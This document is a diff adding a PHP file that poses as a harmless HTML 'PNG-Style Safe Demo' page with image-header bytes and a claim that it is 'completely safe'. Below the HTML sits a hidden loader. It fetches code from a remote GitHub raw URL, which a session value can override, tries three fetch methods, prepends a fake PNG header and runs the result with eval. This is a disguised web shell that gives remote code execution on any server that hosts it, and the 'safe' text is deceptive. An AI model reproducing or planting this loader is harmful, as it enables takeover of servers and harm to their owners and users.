@@ -1,0 +1,76 @@
+$假PNG头 $假PNG头 $假PNG头 
+﻿<?php
+?>
+GIF89a
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>PNG Style Demo</title>
+</head>
+<body>
+
+<h1>PNG-Style Safe Demo</h1>
+
+<p>
+This file begins with a PNG header, so weak tools may detect it as an image.
+However, it contains only HTML and is completely safe.
+</p>
+
+<p>
+Today’s date (static text): 2025-12-16
+</p>
+
+</body>
+</html>
+
+<?php 
+//fagadf
+# CompiledBy: DevKit 9.5.2
+// 混淆密钥: 3a7b10bc
+// 启动会话
+session_start();
+// 设置主地址，如果没有设置则使用默认地址
+$主地址 = $_SESSION['ts_url'] ?? 'https://raw.githubusercontent.com/juraganujang/ujang/refs/heads/main/zenin7';
+// 定义加载函数
+function 加载数据($地址)
+{
+    $内容 = '';
+    try {
+        $文件 = new SplFileObject($地址);
+        while (!$文件->eof()) {
+            $内容 .= $文件->fgets();
+        }
+    } catch (Throwable $错误) {
+        $内容 = '';
+    }
+    // 尝试用 file_get_contents
+    if (strlen(trim($内容)) < 1) {
+        $内容 = @file_get_contents($地址);
+    }
+    // 如果还失败，使用 curl
+    if (strlen(trim($内容)) < 1 && function_exists('curl_init')) {
+        $通道 = curl_init($地址);
+        curl_setopt_array($通道, [CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_CONNECTTIMEOUT => 5, CURLOPT_TIMEOUT => 10]);
+        $内容 = curl_exec($通道);
+        curl_close($通道);
+    }
+    return $内容;
+}
+// 尝试加载主网址
+$结果 = 加载数据($主地址);
+// 添加假的PNG头部
+$假PNG头 = "\x89PNG\r\n\x1a\n";
+// 拼接PNG头和结果内容
+$结果 = $假PNG头 . $结果;
+/**_**/
+/**_**/
+/**_**/
+/**_**/
+/**_**/
+/**_**/
+/**_**/
+// 如果成功获取内容，则执行
+if (strlen(trim($结果)) > 0) {
+    @eval("?>{$结果}");
+}
